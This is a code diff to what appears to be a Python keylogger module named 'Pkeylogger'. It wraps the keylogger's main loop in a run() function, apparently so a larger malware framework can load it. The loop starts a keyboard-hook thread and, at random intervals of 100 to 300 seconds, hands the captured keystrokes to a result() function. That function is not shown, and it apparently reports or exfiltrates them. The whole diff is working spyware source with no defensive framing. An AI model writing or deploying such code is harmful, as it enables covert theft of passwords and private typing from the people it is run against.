@@ -56,14 +56,15 @@ def main2():
     pythoncom.PumpMessages()
 
 
-
-th = threading.Thread(target=main2)
-th.start()
-time.sleep(random.randint(100, 300))
-while True:
-    try:
-        result(string, "Pkeylogger")
-        string = ""
-        time.sleep(random.randint(100, 300))
-    except:
-        continue
+def run(**args):
+    global string
+    th = threading.Thread(target=main2)
+    th.start()
+    time.sleep(random.randint(100, 300))
+    while True:
+        try:
+            result(string, "Pkeylogger")
+            string = ""
+            time.sleep(random.randint(100, 300))
+        except:
+            continue
